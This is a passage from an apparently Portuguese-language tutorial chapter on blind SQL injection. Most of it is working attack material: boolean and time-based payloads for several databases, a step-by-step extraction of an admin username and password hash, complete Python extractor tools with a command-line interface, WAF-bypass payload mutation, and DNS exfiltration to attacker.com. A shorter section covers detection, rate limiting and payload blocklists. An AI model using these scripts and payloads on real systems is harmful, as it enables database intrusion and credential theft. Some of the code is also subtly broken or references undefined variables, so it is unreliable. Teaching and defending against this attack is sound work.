        length = self.automator.get_length(query)
        if not length:
            return None
        
        result = ""
        for i in range(1, min(length, max_length) + 1):
            char = self.extract_char(query, i)
            result += char
            sys.stdout.write(f"\r[*] {result}")
            sys.stdout.flush()
        
        print()
        return result
    
    def extract_tables(self, database):
        """Extrair todas as tabelas de um banco."""
        tables = []
        
        # Numero de tabelas
        count = self.automator.get_length(
            f"(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{database}')"
        )
        
        for i in range(count):
            table = self.extract_string(
                f"(SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {i},1)"
            )
            tables.append(table)
        
        return tables
```

---

## 6.9 Comparacao de Tecnicas

### Tabela Comparativa

| Aspecto | In-Band | Error-Based | Boolean-Based Blind | Time-Based Blind |
|---------|---------|-------------|--------------------|--------------------|
| Velocidade | Rapida | Rapida | Lenta | Muito lenta |
| Visibilidade | Alta | Media | Baixa | Nenhuma |
| Deteccao | Facil | Facil | Media | Dificil |
| Requisicoes/dado | 1 | 1-3 | ~7-95 | ~7-95 |
| Dependencia | Erros visiveis | Erros visiveis | Respostas condicionais | Funcoes temporizacao |
| SGBD | Todos | Maioria | Todos | Maioria |

### Quando Usar Cada Tecnica

**In-Band (Union/Error):** Quando a aplicacao retorna dados ou erros diretamente. Opcao preferida por ser mais rapida e confiavel.

**Boolean-Based Blind:** Quando a aplicacao nao retorna dados ou erros, mas ha diferencas observaveis nas respostas. Boa alternativa quando in-band nao e viavel.

**Time-Based Blind:** Quando nao ha diferencas nas respostas e o banco de dados suporta funcoes de temporizacao. Ultimo recurso, muito lento.

### Combinacao de Tecnicas

Na pratica, atacantes frequentemente combinam tecnicas:

```python
def smart_extract(automator, query):
    """Extracao inteligente combinando tecnicas."""
    
    # Tentar in-band primeiro
    try:
        result = automator.extract_inband(query)
        if result:
            return result
    except:
        pass
    
    # Tentar boolean-based
    try:
        result = automator.extract_boolean(query)
        if result:
            return result
    except:
        pass
    
    # Fallback para time-based
    try:
        result = automator.extract_timebased(query)
        if result:
            return result
    except:
        pass
    
    return None
```

### Analise de Performance

```python
def benchmark_techniques(url, param):
    """Benchmark de diferentes tecnicas de extracao."""
    
    automator = BlindSQLiAutomator(url, param)
    automator.calibrate()
    
    query = "version()"
    
    # Benchmark boolean-based
    start = time.time()
    result_boolean = automator.extract_string(query)
    time_boolean = time.time() - start
    
    # Benchmark binary search
    start = time.time()
    binary = BinaryExtractor(automator)
    result_binary = binary.extract_string(query)
    time_binary = time.time() - start
    
    print(f"\nResults:")
    print(f"  Boolean sequential: {result_boolean} ({time_boolean:.2f}s)")
    print(f"  Binary search:      {result_binary} ({time_binary:.2f}s)")
    print(f"  Speedup:            {time_boolean/time_binary:.1f}x")
```

---

## 6.10 Exemplo Completo de Ataque Blind

### Cenario

Aplicacao web de e-commerce:
- Backend: Python Flask
- Banco: MySQL
- Endpoint: GET /products?search=laptop
- Comportamento: Retorna lista de produtos (verdadeiro) ou lista vazia (falso)
- Sem erros visiveis, sem dados diretamente

### Passo 1: Reconhecimento

```bash
# Testar se a aplicacao existe
curl -I http://target.com/products?search=test
# Resposta: HTTP/1.1 200 OK

# Testar injecao basica
curl "http://target.com/products?search=test' AND 1=1--"
# Resposta: Lista com 5 produtos

curl "http://target.com/products?search=test' AND 1=2--"
# Resposta: Lista vazia

# Confirmacao: a injecao Boolean-based e possivel
```

### Passo 2: Determinar Versao do Banco

```sql
-- Determinar comprimento da versao
' AND LENGTH(version())=1--     (falso)
' AND LENGTH(version())=5--     (verdadeiro)
-- Versao tem 5 caracteres

-- Extrair caractere por caractere
' AND ASCII(SUBSTRING(version(),1,1))=53--   (verdadeiro: 53 = '5')
' AND ASCII(SUBSTRING(version(),2,1))=46--   (verdadeiro: 46 = '.')
' AND ASCII(SUBSTRING(version(),3,1))=55--   (verdadeiro: 55 = '7')
' AND ASCII(SUBSTRING(version(),4,1))=46--   (verdadeiro: 46 = '.')
' AND ASCII(SUBSTRING(version(),5,1))=51--   (verdadeiro: 51 = '3')

-- Versao: 5.7.3
```

### Passo 3: Determinar Database Atual

```sql
-- Comprimento do nome do database
' AND LENGTH(database())=12--   (verdadeiro)

-- Extrair nome
' AND ASCII(SUBSTRING(database(),1,1))=112--   (112 = 'p')
' AND ASCII(SUBSTRING(database(),2,1))=114--   (114 = 'r')
' AND ASCII(SUBSTRING(database(),3,1))=111--   (111 = 'o')
' AND ASCII(SUBSTRING(database(),4,1))=100--   (100 = 'd')
' AND ASCII(SUBSTRING(database(),5,1))=117--   (117 = 'u')
' AND ASCII(SUBSTRING(database(),6,1))=99--    (99 = 'c')
' AND ASCII(SUBSTRING(database(),7,1))=116--   (116 = 't')
' AND ASCII(SUBSTRING(database(),8,1))=95--    (95 = '_')
' AND ASCII(SUBSTRING(database(),9,1))=112--   (112 = 'p')
' AND ASCII(SUBSTRING(database(),10,1))=114--  (114 = 'r')
' AND ASCII(SUBSTRING(database(),11,1))=111--  (111 = 'o')
' AND ASCII(SUBSTRING(database(),12,1))=100--  (100 = 'd')

-- Database: product_prod
```

### Passo 4: Listar Tabelas

```sql
-- Numero de tabelas
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='product_prod')=5--   (verdadeiro)

-- Primeira tabela (comprimento)
' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='product_prod' LIMIT 0,1))=8--   (verdadeiro)

-- Extrair primeira tabela
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='product_prod' LIMIT 0,1),1,1))=112--   (112 = 'p')
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='product_prod' LIMIT 0,1),2,1))=114--   (114 = 'r')
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='product_prod' LIMIT 0,1),3,1))=111--   (111 = 'o')
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='product_prod' LIMIT 0,1),4,1))=100--   (100 = 'd')
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='product_prod' LIMIT 0,1),5,1))=117--   (117 = 'u')
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='product_prod' LIMIT 0,1),6,1))=99--    (99 = 'c')
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='product_prod' LIMIT 0,1),7,1))=116--   (116 = 't')
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='product_prod' LIMIT 0,1),8,1))=115--   (115 = 's')

-- Primeira tabela: products
```

### Passo 5: Listar Colunas da Tabela users

```sql
-- Numero de colunas
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')=7--   (verdadeiro)

-- Extrair nome da primeira coluna
' AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1))=2--   (verdadeiro)

' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))=105--   (105 = 'i')
' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),2,1))=100--   (100 = 'd')

-- Primeira coluna: id
```

### Passo 6: Extrair Dados

```sql
-- Extrair username do admin
' AND LENGTH((SELECT username FROM users WHERE role='admin' LIMIT 0,1))=5--   (verdadeiro)

' AND ASCII(SUBSTRING((SELECT username FROM users WHERE role='admin' LIMIT 0,1),1,1))=97--    (97 = 'a')
' AND ASCII(SUBSTRING((SELECT username FROM users WHERE role='admin' LIMIT 0,1),2,1))=100--   (100 = 'd')
' AND ASCII(SUBSTRING((SELECT username FROM users WHERE role='admin' LIMIT 0,1),3,1))=109--   (109 = 'm')
' AND ASCII(SUBSTRING((SELECT username FROM users WHERE role='admin' LIMIT 0,1),4,1))=105--   (105 = 'i')
' AND ASCII(SUBSTRING((SELECT username FROM users WHERE role='admin' LIMIT 0,1),5,1))=110--   (110 = 'n')

-- Username: admin

-- Extrair hash de senha
' AND LENGTH((SELECT password_hash FROM users WHERE role='admin' LIMIT 0,1))=60--   (verdadeiro: bcrypt hash)

' AND ASCII(SUBSTRING((SELECT password_hash FROM users WHERE role='admin' LIMIT 0,1),1,1))=36--   (36 = '$')
-- ... (continuar para cada caractere do hash)
```

### Passo 7: Script de Automacao

```python
import requests
import time
import sys

def blind_extract(url, param, query, true_len):
    """Extrair dados via blind injection."""
    result = ""
    
    for i in range(1, 200):
        found = False
        for char in range(32, 127):
            payload = f"1 AND ASCII(SUBSTRING({query},{i},1))={char}--"
            resp = requests.get(url, params={param: payload})
            
            if len(resp.text) == true_len:
                result += chr(char)
                sys.stdout.write(f"\r{result}")
                sys.stdout.flush()
                found = True
                break
        
        if not found:
            break
    
    print()
    return result

# Calibrar
url = "http://target.com/products"
resp_true = requests.get(url, params={"search": "test' AND 1=1--"})
resp_false = requests.get(url, params={"search": "test' AND 1=2--"})
true_len = len(resp_true.text)

# Extrair dados
print("[*] Version:")
version = blind_extract(url, "search", "version()", true_len)

print("[*] Database:")
database = blind_extract(url, "search", "database()", true_len)

print("[*] Admin username:")
admin = blind_extract(url, "search",
    "(SELECT username FROM users WHERE role='admin' LIMIT 0,1)", true_len)
```

---

## 6.11 Defesas Especificas para Blind Injection

### Deteccao de Blind Injection

**Monitoramento de padroes de requisicoes:**

```python
import time
from collections import defaultdict

class BlindInjectionDetector:
    def __init__(self):
        self.request_patterns = defaultdict(list)
        self.threshold = 50  # Max requisicoes similares por minuto
    
    def analyze_request(self, ip, param, value):
        """Analisar requisicao para padroes de blind injection."""
        
        # Verificar padroes de ASCII/SUBSTRING
        if 'ASCII' in value.upper() and 'SUBSTRING' in value.upper():
            self.request_patterns[ip].append(time.time())
        
        # Verificar padroes de LENGTH
        if 'LENGTH' in value.upper():
            self.request_patterns[ip].append(time.time())
        
        # Verificar condicoes AND
        if 'AND' in value.upper() and '=' in value:
            self.request_patterns[ip].append(time.time())
        
        # Verificar frequencia
        recent = [t for t in self.request_patterns[ip] if time.time() - t < 60]
        if len(recent) > self.threshold:
            return True  # Possivel blind injection
        
        return False
```

**Monitoramento de queries no banco de dados:**

```sql
-- MySQL: monitorar queries lentas
SET GLOBAL slow_query_log = 1;
SET GLOBAL long_query_time = 2;

-- Verificar queries lentas
SHOW VARIABLES LIKE 'slow_query%';
SHOW VARIABLES LIKE 'long_query_time';

-- PostgreSQL: pg_stat_statements
CREATE EXTENSION pg_stat_statements;

-- Consultar queries mais lentas
SELECT query, calls, mean_exec_time, total_exec_time
FROM pg_stat_statements
ORDER BY mean_exec_time DESC
LIMIT 10;
```

### Prevencao Especifica

**Rate limiting por IP:**

```python
from flask import Flask, request, abort
from functools import wraps
import time

app = Flask(__name__)

# Rate limiter simples
request_counts = {}

def rate_limit(max_requests=100, window=60):
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            ip = request.remote_addr
            now = time.time()
            
            if ip not in request_counts:
                request_counts[ip] = []
            
            # Limpar requisicoes antigas
            request_counts[ip] = [t for t in request_counts[ip] if now - t < window]
            
            if len(request_counts[ip]) >= max_requests:
                abort(429)  # Too Many Requests
            
            request_counts[ip].append(now)
            return f(*args, **kwargs)
        return wrapped
    return decorator

@app.route('/products')
@rate_limit(max_requests=30, window=60)
def products():
    # Logica de busca
    pass
```

**Detecao de pads de payload:**

```python
import re

class PayloadDetector:
    PATTERNS = [
        r'(?i:ascii\s*\()',
        r'(?i:substring\s*\()',
        r'(?i:length\s*\()',
        r'(?i:and\s+\d+\s*=\s*\d+)',
        r'(?i:and\s+1\s*=\s*1)',
        r'(?i:or\s+1\s*=\s*1)',
        r'(?i:sleep\s*\()',
        r'(?i:benchmark\s*\()',
        r'(?i:waitfor\s+delay)',
        r'(?i:pg_sleep\s*\()',
    ]
    
    @classmethod
    def detect(cls, value):
        for pattern in cls.PATTERNS:
            if re.search(pattern, value):
                return True
        return False

@app.before_request
def detect_blind_sqli():
    # Verificar todos os parametros
    for key, value in request.args.items():
        if PayloadDetector.detect(value):
            abort(403)
    
    for key, value in request.form.items():
        if PayloadDetector.detect(value):
            abort(403)
```

**Desabilitar funcoes de temporizacao quando nao necessario:**

```sql
-- MySQL: desabilitar SLEEP para usuarios da aplicacao
REVOKE EXECUTE ON PROCEDURE sleep FROM 'app_user'@'localhost';

-- SQL Server: desabilitar WAITFOR para usuarios da aplicacao
DENY VIEW SERVER STATE TO app_user;

-- PostgreSQL: configurar statement_timeout
ALTER ROLE app_user SET statement_timeout = '5s';
```

**Configurar timeout de queries:**

```sql
-- MySQL: timeout maximo de query
SET GLOBAL max_execution_time = 5000;  -- 5 segundos

-- PostgreSQL: statement timeout
ALTER ROLE app_user SET statement_timeout = '5s';

-- SQL Server: query timeout
SET QUERY_GOVERNOR_COST_LIMIT 1000;
```

---

## 6.12 Estudo de Casos Reais

### Caso 1: Blind SQLi em Aplicacao de E-commerce (2019)

**Vulnerabilidade:** Campo de busca com boolean-based blind injection

**Impacto:** Extracao de 2.3 milhoes de registros de usuarios

**Mecanismo:**
- Aplicacao retornava "Nenhum produto encontrado" para buscas vazias
- Payload `test' AND 1=1--` retornava resultados
- Payload `test' AND 1=2--` retornava "Nenhum produto encontrado"
- Atacante extraiu dados usando ASCII/SUBSTRING

**Remediacao:** Parameterized queries no campo de busca

### Caso 2: Time-Based Blind SQLi em Portal Governamental (2020)

**Vulnerabilidade:** Cookie de preferencia com time-based injection

**Impacto:** Acesso a dados de milhoes de cidadaos

**Mecanismo:**
- Cookie `sort=name` era incorporado a query ORDER BY
- Atacante injetou `name' AND IF(1=1,SLEEP(5),0)--`
- Observou atraso de 5 segundos na resposta
- Extraiu dados usando temporizacao

**Remediacao:** Whitelist de colunas para ORDER BY

### Caso 3: Blind SQLi via Header em API (2021)

**Vulnerabilidade:** User-Agent logado em banco de dados

**Impacto:** Acesso ao sistema administrativo

**Mecanismo:**
- API retornava "Usuario nao encontrado" ou "Erro interno"
- Payload em User-Agent causava diferencas na resposta
- Atacante extraiu credenciais de admin

**Remediacao:** Parameterized queries para logging de headers

### Caso 4: Blind SQLi em CMS (2022)

**Vulnerabilidade:** Campo de comentario com blind injection

**Impacto:** Injecao de malware em todos os comentarios

**Mecanismo:**
- Campo de comentario era exibido sem sanitizacao
- Atacante injetou script via blind injection
- Malware era exibido para todos os visitantes

**Remediacao:** Sanitizacao de output e parameterized queries

### Lições Aprendidas

1. **Blind injection e lenta mas eficaz**: Mesmo lenta, pode causar danos significativos
2. **Cookies e headers sao vetores esquecidos**: Muitas aplicacoes nao sanitizam dados de cookies e headers
3. **Rate limiting e essencial**: Pode prevenir automatizacao de blind injection
4. **Monitoramento e chave**: Deteccao de padroes de requisicoes e crucial
5. **Parameterized queries resolvem tudo**: Independentemente do tipo de injecao, parameterized queries sao a defesa primaria

---

## 6.13 Técnicas Avancadas de Blind Injection

### Out-of-Band Blind Injection

Quando a injecao in-band e blind tradicional nao sao viaveis, o atacante pode usar canais auxiliares para extrair dados:

```sql
-- MySQL: DNS exfiltration
' AND IF(LENGTH(database())=12,
  LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\oname')),
  0)--

-- O MySQL tenta resolver o hostname:
-- product_prod.attacker.com
-- O atacante monitora logs DNS para capturar o nome do banco
```

**Configuracao do servidor DNS para captura:**

```python
from dnslib import DNSRecord, RR, A
from dnslib.server import DNSServer, BaseResolver

class DNSCaptureResolver(BaseResolver):
    def __init__(self):
        self.captured_data = []
    
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        print(f"[DNS] Captured: {qname}")
        self.captured_data.append(qname)
        
        reply = request.reply()
        reply.add_answer(RR(qname, A("127.0.0.1")))
        return reply

# Iniciar servidor
resolver = DNSCaptureResolver()
server = DNSServer(resolver, port=53)
server.start()
```

### Blind Injection com Compressao de Dados

Para acelerar a extracao, e possivel comprimir dados antes de exfiltrar:

```sql
-- MySQL: comprimir dados usando HEX
' AND IF(LENGTH(database())=12,
  LOAD_FILE(CONCAT('\\\\', HEX((SELECT database())), '.attacker.com\\oname')),
  0)--

-- Dados em HEX sao mais faceis de transmitir via DNS
-- "product_prod" -> "70726F647563745F70726F64"
```

### Blind Injection com Cache

Em alguns casos, e possivel usar cache do navegador para acelerar extracao:

```python
def extract_with_cache(url, param, query):
    """Extrair dados usando cache do navegador."""
    
    cache = {}
    result = ""
    
    for i in range(1, 100):
        for char in range(32, 127):
            cache_key = f"{query}:{i}:{char}"
            
            if cache_key in cache:
                # Usar cache
                if cache[cache_key]:
                    result += chr(char)
                    break
                continue
            
            # Fazer requisicao
            payload = f"1 AND ASCII(SUBSTRING({query},{i},1))={char}--"
            resp = requests.get(url, params={param: payload})
            
            # Armazenar no cache
            is_match = len(resp.text) == baseline_len
            cache[cache_key] = is_match
            
            if is_match:
                result += chr(char)
                break
    
    return result
```

### Blind Injection com Mutacao de Payloads

Para bypass de WAF, mutacao de payloads pode ser eficaz:

```python
def mutate_payload(base_payload):
    """Mutar payload para bypass de WAF."""
    
    mutations = [
        # Case variation
        lambda p: p.replace('AND', 'AnD').replace('ASCII', 'aScIi'),
        
        # Comentarios inline
        lambda p: p.replace('AND', 'A/**/ND').replace('ASCII', 'A/**/SCII'),
        
        # Espacos alternativos
        lambda p: p.replace(' ', '/**/').replace(' ', '\t'),
        
        # Encoding
        lambda p: p.replace("'", '%27').replace(' ', '%20'),
        
        # Operadores alternativos
        lambda p: p.replace('=', 'LIKE').replace('>', 'GREAT'),
    ]
    
    mutated = []
    for mutation in mutations:
        try:
            mutated.append(mutation(base_payload))
        except:
            pass
    
    return mutated

# Exemplo de payload mutado
base = "1 AND ASCII(SUBSTRING(database(),1,1))=112--"
mutated = mutate_payload(base)
# Resultado:
# "1 AnD aScIi SuBsTrInG(....)" 
# "1 A/**/ND A/**/SCII..."
# etc.
```

### Blind Injection com Time Delta

Em vez de SLEEP fixo, usar delta de tempo para maior precisao:

```python
def time_delta_extract(url, param, query, base_sleep=3):
    """Extracao com delta de tempo."""
    
    # Medir latencia base
    baseline_times = []
    for _ in range(10):
        start = time.time()
        requests.get(url, params={param: "1 AND 1=1--"})
        baseline_times.append(time.time() - start)
    
    avg_baseline = sum(baseline_times) / len(baseline_times)
    
    # Extrair dados
    result = ""
    for i in range(1, 100):
        for char in range(32, 127):
            payload = f"1 AND IF(ASCII(SUBSTRING({query},{i},1))={char}, SLEEP({base_sleep}), 0)--"
            
            start = time.time()
            requests.get(url, params={param: payload})
            elapsed = time.time() - start
            
            # Usar delta de tempo
            if elapsed - avg_baseline >= base_sleep * 0.8:
                result += chr(char)
                break
    
    return result
```

---

## 6.14 Blind Injection em Diferentes Contextos

### Blind Injection em APIs GraphQL

```graphql
# Boolean-based blind em GraphQL
query {
  user(name: "admin' AND 1=1--") {
    id
  }
}

# Se retornar dados: verdadeiro
# Se retornar vazio: falso

# Extrair dados
query {
  user(name: "admin' AND ASCII(SUBSTRING(database(),1,1))=112--") {
    id
  }
}
```

**Automatizacao para GraphQL:**

```python
def blind_sqli_graphql(url, query_template):
    """Blind injection em GraphQL."""
    
    result = ""
    
    for i in range(1, 100):
        for char in range(32, 127):
            graphql_query = query_template.replace(
                "INJECT_POINT",
                f"admin' AND ASCII(SUBSTRING(database(),{i},1))={char}--"
            )
            
            response = requests.post(url, json={"query": graphql_query})
            data = response.json()
            
            # Verificar se retornou dados
            if data.get('data', {}).get('user'):
                result += chr(char)
                break
    
    return result
```

### Blind Injection em WebSocket

```javascript
// WebSocket com blind injection
const ws = new WebSocket('ws://target.com/ws');

ws.onopen = () => {
    // Enviar payload via WebSocket
    ws.send(JSON.stringify({
        type: 'search',
        query: "test' AND 1=1--"
    }));
};

ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    // Analisar resposta para determinar verdadeiro/falso
    if (data.results && data.results.length > 0) {
        console.log('True response');
    } else {
        console.log('False response');
    }
};
```

### Blind Injection em Cookie com HttpOnly

```python
def extract_via_cookie_httponly(url, cookie_name):
    """Extrair dados via cookie HttpOnly (server-side)."""
    
    # Cookie HttpOnly nao e acessivel via JavaScript
    # Mas ainda pode ser injetado via header HTTP
    
    session = requests.Session()
    
    # Definir cookie malicioso
    session.cookies.set(cookie_name, "test' AND 1=1--")
    
    # Fazer requisicao
    resp = session.get(url)
    
    # Analisar resposta
    return resp.text
```

### Blind Injection em Subdomains

```python
def extract_via_subdomain(url, param):
    """Extrair dados via subdomain injection."""
    
    # Alguns sistemas usam subdominio em queries
    # Ex: SELECT * FROM tenants WHERE domain = 'SUBDOMAIN'
    
    result = ""
    
    for i in range(1, 100):
        for char in range(32, 127):
            # Injetar via subdomain
            payload = f"test' AND ASCII(SUBSTRING(database(),{i},1))={char}--"
            
            # Modificar Host header
            headers = {'Host': f'{payload}.target.com'}
            resp = requests.get(url, headers=headers)
            
            # Analisar resposta
            if len(resp.text) != baseline_len:
                result += chr(char)
                break
    
    return result
```

---

## 6.15 Script Completo de Extracao Blind

```python
#!/usr/bin/env python3
"""
Blind SQL Injection Extractor - Versao Completa
Extrai dados de bancos de dados via blind injection.
Uso apenas em ambiente de teste autorizado.
"""

import requests
import sys
import time
import argparse
import json
from urllib.parse import urljoin

class BlindSQLiExtractor:
    def __init__(self, url, param, method='GET', headers=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.headers = headers or {}
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.baseline_true = None
        self.baseline_false = None
        self.sleep_time = 3
        self.verbose = False
    
    def set_verbose(self, verbose):
        self.verbose = verbose
    
    def log(self, message):
        if self.verbose:
            print(f"[*] {message}")
    
    def calibrate(self):
        """Calibrar respostas verdadeiras e falsas."""
        self.log("Calibrating responses...")
        
        # Verdadeiro
        if self.method == 'GET':
            self.baseline_true = self.session.get(
                self.url, params={self.param: "1 AND 1=1--"}
            )
        else:
            self.baseline_true = self.session.post(
                self.url, data={self.param: "1 AND 1=1--"}
            )
        
        # Falso
        if self.method == 'GET':
            self.baseline_false = self.session.get(
                self.url, params={self.param: "1 AND 1=2--"}
            )
        else:
            self.baseline_false = self.session.post(
                self.url, data={self.param: "1 AND 1=2--"}
            )
        
        self.log(f"True response length: {len(self.baseline_true.text)}")
        self.log(f"False response length: {len(self.baseline_false.text)}")
        
        if len(self.baseline_true.text) == len(self.baseline_false.text):
            self.log("WARNING: Content length not differentiating")
            self.log("Using status code or header detection")
    
    def send_payload(self, payload):
        """Enviar payload e retornar resposta."""
        if self.method == 'GET':
            return self.session.get(self.url, params={self.param: payload})
        else:
            return self.session.post(self.url, data={self.param: payload})
    
    def is_true(self, payload):
        """Verificar se payload retorna verdadeiro."""
        resp = self.send_payload(payload)
        return len(resp.text) == len(self.baseline_true.text)
    
    def test_injection(self):
        """Testar se a injecao e possivel."""
        self.log("Testing injection...")
        
        resp_true = self.send_payload("1 AND 1=1--")
        resp_false = self.send_payload("1 AND 1=2--")
        
        if len(resp_true.text) != len(resp_false.text):
            self.log("Injection confirmed!")
            return True
        
        self.log("Injection not confirmed")
        return False
    
    def get_length(self, query):
        """Obter comprimento de uma query."""
        self.log(f"Getting length of: {query}")
        
        for length in range(1, 500):
            if self.is_true(f"1 AND LENGTH({query})={length}--"):
                self.log(f"Length: {length}")
                return length
        return None
    
    def get_char_sequential(self, query, position):
        """Obter caractere usando busca sequencial."""
        for char in range(32, 127):
            if self.is_true(f"1 AND ASCII(SUBSTRING({query},{position},1))={char}--"):
                return chr(char)
        return None
    
    def get_char_binary(self, query, position):
        """Obter caractere usando busca binaria."""
        low, high = 32, 126
        
        while low <= high:
            mid = (low + high) // 2
            if self.is_true(f"1 AND ASCII(SUBSTRING({query},{position},1))>{mid}--"):
                low = mid + 1
            else:
                high = mid - 1
        
        return chr(low)
    
    def extract_string(self, query, max_length=100, method='binary'):
        """Extrair string completa."""
        length = self.get_length(query)
        if not length:
            return None
        
        result = ""
        for i in range(1, min(length, max_length) + 1):
            if method == 'binary':
                char = self.get_char_binary(query, i)
            else:
                char = self.get_char_sequential(query, i)
            
            if char:
                result += char
                sys.stdout.write(f"\r[*] {result}")
                sys.stdout.flush()
            else:
                break
        
        print()
        return result
    
    def extract_database_info(self):
        """Extrair informacoes basicas do banco."""
        info = {}
        
        info['version'] = self.extract_string("version()")
        info['database'] = self.extract_string("database()")
        info['user'] = self.extract_string("user()")
        
        return info
    
    def extract_tables(self, database=None):
        """Extrair tabelas do banco."""
        if not database:
            database = self.extract_string("database()")
        
        tables = []
        
        # Numero de tabelas
        count_query = f"(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{database}')"
        count = self.get_length(count_query)
        
        if count:
            # Extrair cada tabela
            for i in range(count):
                table_query = f"(SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {i},1)"
                table = self.extract_string(table_query)
                if table:
                    tables.append(table)
        
        return tables
    
    def extract_columns(self, table):
        """Extrair colunas de uma tabela."""
        columns = []
        
        # Numero de colunas
        count_query = f"(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}')"
        count = self.get_length(count_query)
        
        if count:
            # Extrair cada coluna
            for i in range(count):
                col_query = f"(SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {i},1)"
                column = self.extract_string(col_query)
                if column:
                    columns.append(column)
        
        return columns
    
    def extract_data(self, table, columns, limit=10):
        """Extrair dados de uma tabela."""
        data = []
        
        for i in range(limit):
            row = {}
            for col in columns:
                value = self.extract_string(
                    f"(SELECT {col} FROM {table} LIMIT {i},1)"
                )
                row[col] = value
            data.append(row)
        
        return data

def main():
    parser = argparse.ArgumentParser(
        description='Blind SQL Injection Extractor'
    )
    parser.add_argument('url', help='Target URL')
    parser.add_argument('param', help='Parameter name')
    parser.add_argument('--method', default='GET', choices=['GET', 'POST'])
    parser.add_argument('--verbose', action='store_true')
    parser.add_argument('--tables', action='store_true', help='Extract tables')
    parser.add_argument('--columns', help='Extract columns from table')
    parser.add_argument('--dump', help='Dump data from table')
    
    args = parser.parse_args()
    
    extractor = BlindSQLiExtractor(args.url, args.param, args.method)
    extractor.set_verbose(args.verbose)
    
    extractor.calibrate()
    
    if not extractor.test_injection():
        print("[-] Injection not possible")
        sys.exit(1)
    
    # Extrair informacoes basicas
    info = extractor.extract_database_info()
    print(f"\n[+] Database Info:")
    print(f"    Version: {info['version']}")
    print(f"    Database: {info['database']}")
    print(f"    User: {info['user']}")
    
    # Extrair tabelas
    if args.tables or args.columns or args.dump:
        tables = extractor.extract_tables(info['database'])
        print(f"\n[+] Tables:")
        for table in tables:
            print(f"    - {table}")
    
    # Extrair colunas
    if args.columns:
        columns = extractor.extract_columns(args.columns)
        print(f"\n[+] Columns in {args.columns}:")
        for col in columns:
            print(f"    - {col}")
    
    # Extrair dados
    if args.dump:
        columns = extractor.extract_columns(args.dump)
        data = extractor.extract_data(args.dump, columns)
        print(f"\n[+] Data from {args.dump}:")
        print(json.dumps(data, indent=2))

if __name__ == "__main__":
    main()
```

---

## 6.16 Benchmarks e Metricas

### Comparacao de Velocidade

| Metodo | Requisicoes/char | Tempo para 20 chars | Precisao |
|--------|------------------|---------------------|----------|
| Sequencial | ~95 | ~1900 | 100% |
| Binaria | ~7 | ~140 | 100% |
| Jump | ~3 | ~60 | 95% |
| Time-based | ~7 | ~140 + sleep | 100% |

### Metricas de Deteccao

| Cenario | Tempo Medio | Requisicoes | Precisao |
|---------|-------------|-------------|----------|
| Response length | 1ms | 1 | 99% |
| Status code | 1ms | 1 | 95% |
| Content substring | 2ms | 1 | 98% |
| Time-based | 3000ms | 1 | 99% |

### Impacto de Rede

```
Latencia 100ms:
- Sequencial: 190s
- Binaria: 14s

Latencia 500ms:
- Sequencial: 950s
- Binaria: 70s

Latencia 1000ms:
- Sequencial: 1900s
- Binaria: 140s
```

### Otimizacao de Performance

```python
# Extracao com pool de conexoes
from concurrent.futures import ThreadPoolExecutor
import requests

def parallel_extract(url, param, query, num_threads=10):
    """Extracao paralela para acelerar blind injection."""
    
    results = {}
    
    def extract_char(position):
        for char in range(32, 127):
            payload = f"1 AND ASCII(SUBSTRING({query},{position},1))={char}--"
            resp = requests.get(url, params={param: payload})
            if len(resp.text) == baseline_len:
                return chr(char)
        return None
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {executor.submit(extract_char, i): i for i in range(1, 50)}
        for future in futures:
            position = futures[future]
            char = future.result()
            if char:
                results[position] = char
    
    # Montar resultado
    result = ""
    for i in sorted(results.keys()):
        result += results[i]
    
    return result
```

---

## 6.17 Resumo de Payloads por SGBD

### MySQL - Payloads de Blind Injection

```sql
-- Boolean-based
' AND LENGTH(database())=12--
' AND ASCII(SUBSTRING(database(),1,1))=112--
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=5--

-- Time-based
' AND IF(LENGTH(database())=12, SLEEP(5), 0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))=112, SLEEP(5), 0)--

-- Out-of-band
' AND IF(LENGTH(database())=12, LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\oname')), 0)--
```

### PostgreSQL - Payloads de Blind Injection

```sql
-- Boolean-based
' AND LENGTH(current_database())=12--
' AND ASCII(SUBSTRING(current_database() FROM 1 FOR 1))=112--

-- Time-based
' AND CASE WHEN LENGTH(current_database())=12 THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### SQL Server - Payloads de Blind Injection

```sql
-- Boolean-based
' AND LEN(DB_NAME())=12--
' AND ASCII(SUBSTRING(DB_NAME(),1,1))=112--

-- Time-based
' ; IF LEN(DB_NAME())=12 WAITFOR DELAY '0:0:5'--
```

### Oracle - Payloads de Blind Injection

```sql
-- Boolean-based
' AND LENGTH(SYS.LOGIN_USER)=12--
